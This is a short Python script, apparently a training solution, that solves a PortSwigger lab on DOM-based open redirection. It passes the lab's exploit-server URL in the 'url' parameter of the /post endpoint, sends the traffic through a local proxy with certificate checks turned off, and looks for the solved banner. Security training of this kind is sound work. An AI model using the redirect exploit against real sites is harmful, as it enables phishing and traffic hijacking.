import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import html

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection
# author: 0xyf


class DOMBased4:
    def __init__(self):
        self.lab_id = "0a8300760471c68980f79eed0087008f"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/post"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, params):
        r = requests.get(
            f"{self.vuln_url}",
            params=params,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom(self):
        self.get_exploit_srv_url()
        params = f"postId=1&url={self.exploit_srv_url}"
        r = self.execute_request(params)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom()
        self.check_solved()


def main():
    DOMBased4().solve()


if __name__ == "__main__":
    main()
